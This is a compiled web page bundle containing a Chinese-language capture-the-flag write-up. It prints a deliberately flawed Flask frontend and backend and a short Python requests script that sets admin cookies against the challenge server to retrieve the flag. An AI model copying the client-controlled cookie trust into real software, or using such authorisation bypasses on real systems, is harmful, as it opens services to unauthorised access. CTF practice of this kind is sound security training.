import{_ as n,o as s,c as a,a as t}from"./app-26a1f23c.js";const p={},o=t(`<p>题目说明：HTTP requests and libraries are hard. Sometimes they do not behave as expected, which might lead to vulnerabilities. 附件：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response<span class="token punctuation">,</span> request
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> io

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;role&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;guest&quot;</span><span class="token punctuation">}</span>

    output <span class="token operator">=</span> io<span class="token punctuation">.</span>StringIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
    output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;Usage: Look at the code ;-)\\n\\n&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;Overwriting cookies with default value! This must be secure!\\n&quot;</span><span class="token punctuation">)</span>
        cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token operator">**</span><span class="token builtin">dict</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">**</span>cookies<span class="token punctuation">}</span>
        headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token operator">**</span><span class="token builtin">dict</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span><span class="token punctuation">}</span>

        <span class="token keyword">if</span> cookies<span class="token punctuation">[</span><span class="token string">&quot;role&quot;</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">&quot;guest&quot;</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">&quot;Illegal access!&quot;</span><span class="token punctuation">)</span>

        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>
            <span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;http://backend:8080/whoami&quot;</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers
        <span class="token punctuation">)</span>
        prep <span class="token operator">=</span> r<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span><span class="token punctuation">)</span>

        output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;Prepared request cookies are: &quot;</span><span class="token punctuation">)</span>
        output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>prep<span class="token punctuation">.</span>_cookies<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;\\n&quot;</span><span class="token punctuation">)</span>
        output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;Sending request...&quot;</span><span class="token punctuation">)</span>
        output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;\\n&quot;</span><span class="token punctuation">)</span>

        resp <span class="token operator">=</span> s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>prep<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2.0</span><span class="token punctuation">)</span>

        output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;Request cookies are: &quot;</span><span class="token punctuation">)</span>
        output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>request<span class="token punctuation">.</span>_cookies<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;\\n\\n&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">&quot;Admin&quot;</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;Someone&#39;s drunk oO\\n\\n&quot;</span><span class="token punctuation">)</span>
        output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;Response is: &quot;</span><span class="token punctuation">)</span>
        output<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;\\n\\n&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
        output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;Error :-/&quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
        output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;\\n\\n&quot;</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> Response<span class="token punctuation">(</span>output<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">&quot;text/plain&quot;</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">&quot;0.0.0.0&quot;</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token string">&quot;8080&quot;</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> os
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&quot;/whoami&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">whoami</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    role <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;role&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;guest&quot;</span><span class="token punctuation">)</span>
    really <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;really&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;no&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> role <span class="token operator">==</span> <span class="token string">&quot;admin&quot;</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> really <span class="token operator">==</span> <span class="token string">&quot;yes&quot;</span><span class="token punctuation">:</span>
            resp <span class="token operator">=</span> <span class="token string">&quot;Admin: &quot;</span> <span class="token operator">+</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">&quot;FLAG&quot;</span><span class="token punctuation">]</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            resp <span class="token operator">=</span> <span class="token string">&quot;Guest: Nope&quot;</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        resp <span class="token operator">=</span> <span class="token string">&quot;Guest: Nope&quot;</span>
    <span class="token keyword">return</span> Response<span class="token punctuation">(</span>resp<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">&quot;text/plain&quot;</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">&quot;0.0.0.0&quot;</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token string">&quot;8080&quot;</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到 <code>backend.py</code> 中，只有 cookie 中的 role 为 admin 且 really 为 yes 才会返回 flag ![[Pasted image 20230312151718.png]] 页面会显示出一些发送的信息 这里用 python 构造请求并发送：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">&quot;http://52.59.124.14:10014/&quot;</span>
cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;role&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;admin&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;really&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;yes&quot;</span><span class="token punctuation">}</span>
res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>即可</p>`,6),e=[o];function u(c,i){return s(),a("div",null,e)}const r=n(p,[["render",u],["__file","reguest.html.vue"]]);export{r as default};
